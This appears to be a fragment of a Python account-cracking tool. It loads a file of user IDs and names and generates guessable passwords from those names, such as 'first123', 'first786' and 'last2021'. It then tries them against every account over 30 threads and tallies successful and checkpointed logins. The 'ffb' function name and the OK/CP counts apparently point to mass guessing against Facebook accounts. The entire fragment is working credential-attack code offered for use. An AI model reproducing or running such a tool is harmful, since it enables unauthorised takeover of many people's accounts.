def File():
	clear()
	file = input(' Put file path\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		exit(' File location not found ')
	linex()
	print(' Select Password Crack menu \n\n [1] Crack with auto password \n \n [3] Crack with manual password\n [2] Crack with auto+manual password');linex()
	cs = input('\n   \x1b[1;33m Choose option >>> ')
	plist=[]
	if cs in ['y','Y','yes','Yes','1','01']:
		plist.append('First Last')
		plist.append('first last')
		plist.append('first')
		#plist.append('firstlast')
		plist.append('last2021')
		plist.append('first123')
		plist.append('first12345')
		plist.append('first786')
		plist.append('firstlast123')
		plist.append('first1122')
		plist.append('first@@@')
		plist.append('first@@@@')
		plist.append('first1234')
		plist.append('first0099')
		plist.append('first2023')
		plist.append('first@@11')
		plist.append('first@123')
		plist.append('last123')
		plist.append('last1234')
		plist.append('last2021')
		plist.append('last1122')
	elif cs in ['3','03']:
		clear()
		plist.append('First Last')
		plist.append('first last')
		#plist.append('firstlast')
		plist.append('first123')
		#plist.append('first12345')
		#plist.append('first786')
		plist.append('firstlast123')
		plist.append('first1122')
		plist.append('first@@@')
		#plist.append('first@@@@')
		plist.append('first1234')
		#plist.append('first0099')
		#plist.append('first2023')
		#plist.append('first@@11')
		plist.append('first@123')
		plist.append('last123')
		plist.append('last1234')
		#plist.append('last2021')
		plist.append('last1122')
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		print ("\033[1;32m dont use this password first123,first12345,first786,firstlast123,first1122,first@@@,first@@@@,first1234,first0099,first2023,first@@11,first@123,last123,last1234,last2021,last1122 \n")
		print('\033[1;32m exp: khankhan,112233445566,20222022 \n')
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
	elif cs in ['2','02']:
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		print('\033[1;32m exp: first last,firtslast,first123')
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
	with ThreadPool(max_workers=30) as crack_submit:
		total_ids = str(len(fo))
		print ("Total Ids = "+total_ids)
		print ("Note : Tools WiFi Working Don't West Your Mobile Data ")
		linex()
		print("")
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			crack_submit.submit(ffb,ids,names,passlist)
	print("")
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	menu()